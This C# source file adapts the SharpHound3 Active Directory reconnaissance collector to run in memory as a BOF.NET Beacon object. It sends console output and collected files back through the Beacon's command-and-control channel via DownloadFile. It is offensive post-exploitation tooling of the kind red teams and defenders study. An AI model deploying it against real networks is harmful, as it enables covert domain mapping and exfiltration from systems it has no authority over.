using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using BOFNET;

namespace SharpHound3
{
    public class BOFNET : BeaconObject
    {
        public BOFNET(BeaconApi api) : base(api) { }

        volatile static ProducerConsumerStream memStream = new ProducerConsumerStream();
        volatile static bool RunThread;

        public volatile static BOFNET bofnet = null;
        public volatile static Mutex mutex = new Mutex();

        public override void Go(string[] args)
        {
            try
            {
                // Redirect stdout to MemoryStream
                StreamWriter memStreamWriter = new StreamWriter(memStream);
                memStreamWriter.AutoFlush = true;
                Console.SetOut(memStreamWriter);
                Console.SetError(memStreamWriter);

                // Add reference to BeaconObject for OutputTasks
                bofnet = this;

                // Start thread to check MemoryStream to send data to Beacon
                RunThread = true;
                Thread runtimeWriteLine = new Thread(() => RuntimeWriteLine());
                runtimeWriteLine.Start();

                // Run main program passing original arguments
                Task.Run(() => SharpHound3.SharpHound.Main(args)).GetAwaiter().GetResult();

                // Trigger safe exit of thread, ensuring MemoryStream is emptied too
                RunThread = false;
                runtimeWriteLine.Join();
            }
            catch (Exception ex)
            {

                BeaconConsole.WriteLine(String.Format("[!] BOF.NET Exception: {0}.", ex));
            }
        }

        public void PassDownloadFile(string filename, ref MemoryStream fileStream)
        {
            mutex.WaitOne();
            try
            {
                DownloadFile(filename, fileStream);
            }
            catch (Exception ex)
            {
                BeaconConsole.WriteLine(String.Format("[!] BOF.NET Exception during DownloadFile(): {0}.", ex));
            }
            mutex.ReleaseMutex();
        }

        public static void RuntimeWriteLine()
        {
            bool LastCheck = false;
            while (RunThread == true || LastCheck == true)
            {
                int offsetWritten = 0;
                int currentCycleMemstreamLength = Convert.ToInt32(memStream.Length);
                if (currentCycleMemstreamLength > offsetWritten)
                {
                    mutex.WaitOne();
                    try
                    {
                        var byteArrayRaw = new byte[currentCycleMemstreamLength];
                        int count = memStream.Read(byteArrayRaw, offsetWritten, currentCycleMemstreamLength);

                        if (count > 0)
                        {
                            // Need to stop at last new line otherwise it will run into encoding errors in the Beacon logs.
                            int lastNewLine = 0;
                            for (int i = 0; i < byteArrayRaw.Length; i++)
                            {
                                if (byteArrayRaw[i] == '\n')
                                {
                                    lastNewLine = i;
                                }
                            }
                            if (LastCheck)
                            {
                                // If last run ensure all remaining MemoryStream data is obtained.
                                lastNewLine = currentCycleMemstreamLength;
                            }
                            if (lastNewLine > 0)
                            {
                                var byteArrayToLastNewline = new byte[lastNewLine];
                                Buffer.BlockCopy(byteArrayRaw, 0, byteArrayToLastNewline, 0, lastNewLine);
                                bofnet.BeaconConsole.WriteLine(Encoding.ASCII.GetString(byteArrayToLastNewline));
                                offsetWritten = offsetWritten + lastNewLine;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        bofnet.BeaconConsole.WriteLine(ex);
                    }
                    mutex.ReleaseMutex();
                }
                Thread.Sleep(50);
                if (LastCheck)
                {
                    break;
                }
                if (RunThread == false && LastCheck == false)
                {
                    LastCheck = true;
                }
            }
        }
    }

    // Code taken from Polity at: https://stackoverflow.com/questions/12328245/memorystream-have-one-thread-write-to-it-and-another-read
    // Provides means to have multiple threads reading and writing from and to the same MemoryStream
    public class ProducerConsumerStream : Stream
    {
        private readonly MemoryStream innerStream;
        private long readPosition;
        private long writePosition;

        public ProducerConsumerStream()
        {
            innerStream = new MemoryStream();
        }

        public override bool CanRead { get { return true; } }

        public override bool CanSeek { get { return false; } }

        public override bool CanWrite { get { return true; } }

        public override void Flush()
        {
            lock (innerStream)
            {
                innerStream.Flush();
            }
        }

        public override long Length
        {
            get
            {
                lock (innerStream)
                {
                    return innerStream.Length;
                }
            }
        }

        public override long Position
        {
            get { throw new NotSupportedException(); }
            set { throw new NotSupportedException(); }
        }

        public override int Read(byte[] buffer, int offset, int count)
        {
            lock (innerStream)
            {
                innerStream.Position = readPosition;
                int red = innerStream.Read(buffer, offset, count);
                readPosition = innerStream.Position;

                return red;
            }
        }

        public override long Seek(long offset, SeekOrigin origin)
        {
            throw new NotSupportedException();
        }

        public override void SetLength(long value)
        {
            throw new NotImplementedException();
        }

        public override void Write(byte[] buffer, int offset, int count)
        {
            lock (innerStream)
            {
                innerStream.Position = writePosition;
                innerStream.Write(buffer, offset, count);
                writePosition = innerStream.Position;
            }
        }
    }
}